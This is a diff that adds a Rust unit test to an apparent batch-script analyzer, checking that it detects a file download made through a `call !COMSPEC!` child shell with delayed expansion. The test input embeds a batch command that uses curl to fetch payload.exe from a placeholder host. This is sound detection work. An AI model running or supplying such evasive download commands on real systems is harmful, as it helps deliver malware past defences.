@@ -20135,6 +20135,24 @@ mod call_wrapper_tests {
             report.traits
         );
     }
+
+    #[test]
+    fn call_bang_comspec_child_preserves_delayed_expansion() {
+        let script = br#"setlocal EnableDelayedExpansion
+call !COMSPEC! /V:ON /c "set U=https://call-bang-comspec.example/payload.exe&&curl -o payload.exe !U!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://call-bang-comspec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "call !COMSPEC! child did not preserve delayed expansion: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
